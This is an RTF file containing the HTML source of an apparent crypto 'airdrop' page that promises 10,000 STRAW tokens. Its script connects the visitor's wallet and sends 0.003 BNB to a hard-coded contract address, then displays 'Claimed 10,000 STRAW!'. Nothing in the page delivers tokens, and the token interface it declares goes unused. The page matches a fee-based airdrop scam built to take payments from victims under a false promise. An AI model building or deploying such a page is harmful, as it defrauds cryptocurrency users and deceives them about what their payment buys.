{\rtf1\ansi\ansicpg1251\cocoartf2822
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;}
{\*\expandedcolortbl;;}
\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\fs24 \cf0 <!DOCTYPE html>\
<html>\
<head>\
  <meta charset="UTF-8" />\
  <title>Claim Strawberry Coin</title>\
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>\
  <style>\
    body \{ font-family: sans-serif; text-align: center; margin-top: 50px; \}\
    button \{ padding: 12px 24px; font-size: 18px; cursor: pointer; \}\
  </style>\
</head>\
<body>\
  <h1>Claim 10,000 STRAW</h1>\
  <p>To claim your Strawberry Coin, connect wallet and confirm payment of $1.5 in BNB</p>\
  <button onclick="claimTokens()">Claim Now</button>\
\
  <script>\
    const airdropContractAddress = "0xd46138cf460e410DBc5247B313A19aA2667Cb7BB"; // Strawberry Airdrop\
    const tokenContractAddress = "0xD543a0d38e4852bd6787f8870894365E4482417d"; // STRAW token\
    const tokenABI = [\
      \{\
        "inputs": [ \{ "internalType": "address", "name": "account", "type": "address" \} ],\
        "name": "balanceOf",\
        "outputs": [ \{ "internalType": "uint256", "name": "", "type": "uint256" \} ],\
        "stateMutability": "view",\
        "type": "function"\
      \},\
      \{\
        "inputs": [\
          \{ "internalType": "address", "name": "recipient", "type": "address" \},\
          \{ "internalType": "uint256", "name": "amount", "type": "uint256" \}\
        ],\
        "name": "transfer",\
        "outputs": [ \{ "internalType": "bool", "name": "", "type": "bool" \} ],\
        "stateMutability": "nonpayable",\
        "type": "function"\
      \}\
    ];\
\
    async function claimTokens() \{\
      if (typeof window.ethereum === 'undefined') \{\
        alert("Please install MetaMask or BNB-compatible wallet.");\
        return;\
      \}\
\
      const web3 = new Web3(window.ethereum);\
      await ethereum.request(\{ method: 'eth_requestAccounts' \});\
      const accounts = await web3.eth.getAccounts();\
      const user = accounts[0];\
\
      try \{\
        await web3.eth.sendTransaction(\{\
          from: user,\
          to: airdropContractAddress,\
          value: web3.utils.toWei("0.003", "ether") // ~1.5 USD in BNB\
        \});\
        alert("\uc0\u9989  Claimed 10,000 STRAW! Check your wallet.");\
      \} catch (err) \{\
        alert("\uc0\u10060  Transaction failed: " + err.message);\
      \}\
    \}\
  </script>\
</body>\
</html>\
}